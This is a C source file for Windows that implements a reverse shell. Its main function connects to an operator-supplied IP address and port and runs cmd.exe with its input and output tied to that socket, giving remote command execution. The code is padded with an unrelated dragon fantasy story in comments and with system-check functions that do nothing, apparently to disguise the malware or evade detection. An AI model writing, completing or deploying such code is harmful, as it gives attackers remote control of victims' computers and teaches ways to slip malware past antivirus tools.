#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")
#include <windows.h>
#include <lmcons.h>
#include <tchar.h>
#include <time.h>


WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "<your ip>"; 
char port[6] = "<port>";           

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

//n the ancient realm of Eldoria, a dragon named Eldraxia soared the skies with radiant scales and eyes filled with ancient wisdom. Revered as the guardian of the land, Eldraxia's legend spoke of benevolence and protection.

//As whispers of a dark prophecy emerged, Eldraxia retreated to her lair, and a sorcerer named Alaric sought her guidance. Together, they discovered that the prophecy warned not of the dragon's descent into darkness but of a cosmic imbalance threatening Eldoria.

//United, Alaric and Eldraxia embarked on a quest to restore harmony, overcoming challenges that strengthened their bond. In the end, they succeeded, turning Eldraxia from a guardian into a symbol of wisdom and the enduring power of unity. The tale of Eldraxia became a legendary story of magic, destiny, and the unbreakable bond between a dragon and a courageous soul.

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    TCHAR cmd[255] = TEXT("cmd.exe");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}


BOOL checkWindowsUsername() {
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    
  
    return GetUserName(username, &size);
}


BOOL checkOSInfo() {
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    
   
    return GetVersionEx(&osvi);
}


BOOL checkSystemInfo() {
  
    return system("systeminfo") == 0;
}


BOOL checkCurrentTime() {
    time_t t;
    struct tm* timeinfo;
    

    time(&t);
    timeinfo = localtime(&t);
    
   
    return timeinfo != NULL;
}

int another() {
   
    BOOL usernameCheck = checkWindowsUsername();

    
    BOOL osInfoCheck = checkOSInfo();

    
    BOOL systemInfoCheck = checkSystemInfo();

   
    BOOL currentTimeCheck = checkCurrentTime();

   
    if (usernameCheck) {
        
    } else {
       
    }

    
    if (osInfoCheck) {
        
    } else {
        
    }

   
    if (systemInfoCheck) {
       
    } else {
       
    }

   
    if (currentTimeCheck) {
        
    } else {
       
    }

    return 0;
}
